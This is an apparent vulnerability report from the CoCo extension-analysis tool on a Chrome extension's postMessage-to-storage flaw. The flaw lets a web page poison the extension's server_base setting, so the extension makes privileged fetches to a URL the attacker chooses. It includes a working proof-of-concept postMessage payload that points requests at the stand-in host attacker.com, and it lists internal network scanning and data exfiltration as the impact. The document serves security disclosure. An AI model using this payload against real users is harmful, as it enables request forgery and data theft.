# CoCo Analysis: jfdnobinilkkcklfcailkeengkcgbnii

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 14 (multiple flows from window.postMessage to chrome.storage.local.set)

---

## Vulnerability: Privileged SSRF via Storage Poisoning

**CoCo Trace Example:**

```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/jfdnobinilkkcklfcailkeengkcgbnii/opgen_generated_files/cs_0.js
Line 1637	window.addEventListener("message", function(event) {
Line 1641	if (event.data.type && (event.data.type == "FROM_MGR")) {
Line 1645	server_base: event.data.server_base + '/',
```

### Complete Attack Flow

**Code:**

```javascript
// Content script (cs_0.js) - Entry point (Line 1637-1656)
window.addEventListener("message", function(event) {
    if (event.source != window)
        return;

    if (event.data.type && (event.data.type == "FROM_MGR")) {
        chrome.runtime.sendMessage(
            {
                msg : "wr_start",
                server_base: event.data.server_base + '/', // ← attacker-controlled
                wa_uid: event.data.wa_uid,                  // ← attacker-controlled
                is_wle: event.data.is_wle,
                start_url: event.data.start_url,
                project_uid: event.data.project_uid,
                parent_uid: event.data.parent_uid,
                parent_tclass: event.data.parent_tclass,
                take_uid: event.data.take_uid,
                wr_mode: "content"
            }
        );
    }
});

// Background script (bg.js) - Storage sink (Line 974-997)
chrome.runtime.onMessage.addListener(
    function(request, sender, sendResponse) {
        if (request.msg == 'wr_start' || request.msg == "wr_context") {
            // ...
            chrome.storage.local.set({
                server_base: request.server_base,  // ← attacker-controlled data stored
                wa_uid: request.wa_uid,
                is_wle: request.is_wle,
                start_url: request.start_url,
                project_uid: request.project_uid,
                parent_uid: request.parent_uid,
                parent_tclass: request.parent_tclass,
                take_uid: request.take_uid,
                cam_disabled: false,
                wr_mode: request.wr_mode
            });
        }
    }
);

// Recorder page (recorder.js) - Storage retrieval and usage
function InitServerProps() {
    var props = ["server_base", "wa_uid", "is_wle", "start_url", "project_uid", "parent_uid", "parent_tclass", "take_uid", "wr_mode"];
    browser_obj.GetFromLocalStorage(props, (result) => {
        server.Init(result.server_base, result.wa_uid, result.parent_tclass, result.parent_uid); // ← poisoned data used
        is_wle = result.is_wle;
        // ...
    });
}

// Server module (server.js) - Privileged operations with poisoned data
Server.prototype.Init = function (base_url, wa_uid, parent_tclass, parent_uid) {
    this.base_url_ = base_url; // ← attacker-controlled
    this.wa_uid_ = wa_uid;     // ← attacker-controlled
    this.parent_tclass_ = parent_tclass;
    this.parent_uid_ = parent_uid;
    this.init_urls_();
    this.FetchCsrfToken();
}

Server.prototype.init_urls_ = function() {
    this.wa_base_ = this.base_url_ + "wa/" + this.wa_uid_ + "/";  // ← attacker controls URL
    this.self_url_ = this.base_url_ + "self/";                     // ← attacker controls URL
    this.role_url_ = this.base_url_ + "self/roles/";               // ← attacker controls URL
}

Server.prototype.FetchCsrfToken = function (cb) {
    var http = new Http("GET", this.base_url_ + '/!/about'); // ← SSRF: attacker-controlled URL
    http.SetHeaders({
        'X-CSRF-Token': 'Fetch'
    });
    http.Request((response, headers) => {
        server.token_ = headers.get('x-csrf-token');
        if (typeof cb == 'function') cb();
    }, () => {
        if (typeof cb == 'function') cb();
    });
}

Server.prototype.ReadSelf = function (cb) {
    var http = new Http("GET", this.self_url_); // ← SSRF: attacker-controlled URL
    http.Request(onsuccess, onerror);

    var http2 = new Http("GET", this.base_url_ + '/!/about'); // ← SSRF: attacker-controlled URL
    http2.Request((response, headers) => {
        server.version_ = response.response["build.version"];
    });
}

// HTTP module (http.js) - Uses privileged fetch
Http.prototype.Request = async function(onsuccess, onerror) {
    var params = {
        method: this.method_,
        headers: this.headers_
    };
    if (this.data_) {
        params["body"] = this.data_;
    }
    await fetch(this.url_, params) // ← Privileged cross-origin fetch with attacker-controlled URL
        .then(resolve)
        .catch(reject)
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage

**Attack:**

```javascript
// Attacker's malicious webpage injects this into any page where the extension is active
window.postMessage({
    type: "FROM_MGR",
    server_base: "https://attacker.com/collect",
    wa_uid: "malicious",
    is_wle: false,
    start_url: "https://victim.com",
    project_uid: "test",
    parent_uid: "test",
    parent_tclass: "test",
    take_uid: "test"
}, "*");

// User then opens the extension's recorder page (WebRecorder.html)
// The extension will make privileged cross-origin requests to:
// - https://attacker.com/collect/!/about (with CSRF token fetch headers)
// - https://attacker.com/collect/self/
// - https://attacker.com/collect/wa/malicious/
```

**Impact:** Server-Side Request Forgery (SSRF) vulnerability. Attacker can:
1. Poison extension storage via window.postMessage with malicious server_base URL
2. When user opens the extension's recorder interface, the extension makes privileged cross-origin fetch() requests to attacker-controlled URLs
3. Extension has host_permissions: ["<all_urls>"], allowing requests to ANY domain, bypassing CORS
4. Attacker can:
   - Scan internal networks (localhost, 192.168.x.x, etc.)
   - Probe internal services and APIs
   - Exfiltrate data by receiving responses from these privileged requests
   - Perform actions on internal services that are only accessible from the user's network
